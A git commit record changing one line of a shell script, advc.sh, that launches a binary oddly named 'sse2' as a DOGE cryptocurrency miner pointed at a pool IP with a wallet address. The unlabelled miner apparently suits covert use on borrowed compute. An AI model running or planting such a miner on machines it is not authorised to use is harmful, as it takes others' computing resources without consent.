095534604a6ac529b391b4f9e63ed3e2df9adf8a
Shin <dirianda187@gmail.com>
2026-01-08 23:34:16 +0700

    Update advc.sh

--- advc.sh
+++ advc.sh
@@ -1,1 +1,1 @@
-./sse2 -a yespowersugar -o 104.26.10.22:6241 -u DL1QPkjfS5marmWc38jNKRSpGBUEKoyspf.1 -p c=DOGE -t 4
+./sse2 -a yespowersugar -o stratum+tcp://104.26.10.22:6241 -u DL1QPkjfS5marmWc38jNKRSpGBUEKoyspf.1 -p c=DOGE -t 4
